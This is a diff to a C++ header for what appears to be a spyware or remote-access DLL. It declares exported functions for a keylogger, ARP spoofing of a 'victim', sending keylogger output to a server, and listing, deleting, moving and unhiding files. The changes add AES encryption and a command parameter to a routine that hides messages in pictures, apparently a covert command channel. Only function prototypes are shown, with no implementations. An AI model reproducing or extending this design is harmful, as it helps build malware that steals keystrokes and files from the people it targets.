@@ -17,6 +17,7 @@
 #include <iterator>
 #include <thread>
 #include "MyFileClass.h"
+#include "AES_crypto.h"
 #include <opencv2/highgui/highgui.hpp>
 #include <opencv2/imgproc/imgproc.hpp>
 //#include <opencv2/opencv.hpp>
@@ -39,7 +40,7 @@ extern "C" {
 	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
 	extern __declspec(dllexport) string StartKeyLogger(string nothing);
 	extern __declspec(dllexport) string StopKeyLogger(string nothing);
-	extern __declspec(dllexport) string HideMessageInPicture(string fileName);
+	extern __declspec(dllexport) string HideMessageInPicture(string fileName_and_cmd);
 #else
 	extern __declspec(dllexport) string RunNetstat(string nothing);
 	extern __declspec(dllexport) string GetAllFiles(string dir);
@@ -50,10 +51,11 @@ extern "C" {
 	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
 	extern __declspec(dllexport) string StartKeyLogger(string nothing);
 	extern __declspec(dllexport) string StopKeyLogger(string nothing);
-	extern __declspec(dllexport) string HideMessageInPicture(string fileName);
+	extern __declspec(dllexport) string HideMessageInPicture(string fileName_and_cmd);
 
 #endif
 }
+
 /*
 Declarations of functions which are internal
 */
@@ -68,10 +70,11 @@ string DeleteGivenFile(string file);
 string UnHideFileOrFolder(string pathtofileorfolder);
 string MoveGivenFileToDestination(string pathtofile, string Destination);
 string SplitArpLine(string line);
-void SendKeyLoggerToServer();
 void KeyLogger();
 bool SpecialKeys(int S_Key);
-void SendPicture(string fileName);
-string EncodeTextInsideImg(string fileName);
-void SpoofVictimInThread(std::string ip);
+void SendPicture(string fileName, string cmd);
+void SendKeyLoggerToServer(string sharedKey);
+string EncodeTextInsideImg(string fileName, string cmd);
 #endif
+
+
